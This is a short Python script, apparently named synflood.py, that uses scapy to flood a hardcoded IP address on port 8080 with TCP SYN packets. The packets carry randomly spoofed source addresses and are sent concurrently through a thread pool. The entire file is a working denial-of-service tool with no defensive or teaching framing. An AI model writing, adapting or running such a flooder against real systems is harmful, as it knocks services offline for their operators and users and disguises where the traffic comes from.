#! /usr/bin/env python
# -*- coding: utf-8 -*-

import time
import random
import sys, getopt
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor

dosip = "117.113.42.10"
dport = 8080

def SendPkt(dosip,dport):
	ip3 = random.randint(1,253)
	ip4 = random.randint(1,253)
	randip = "58.132.%s.%s"%(ip3,ip4)
	sport = random.randint(10000,65535)
	try:
		synpkt = IP(src=randip,dst=dosip)/TCP(sport=sport,dport=dport,flags="S")
		send(synpkt)
		time.sleep(1)
	except Exception, e:
		return e
		
def main(argv):
	Thread = ''
	Number = ''
	try:
		opts, args = getopt.getopt(argv,"hr:n:")
	except getopt.GetoptError:
		print 'synflood.py -r <thread> -n <number>'
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print 'synflood.py -r <thread> -n <number>'
			sys.exit()
		elif opt in ("-r"):
			Thread = arg
		elif opt in ("-n"):
			Number = arg
	with ThreadPoolExecutor(int(Thread)) as executor:
		for i in range(0,int(Number)):
			executor.submit(SendPkt,dosip,dport)
    
if __name__ == '__main__':
	main(sys.argv[1:])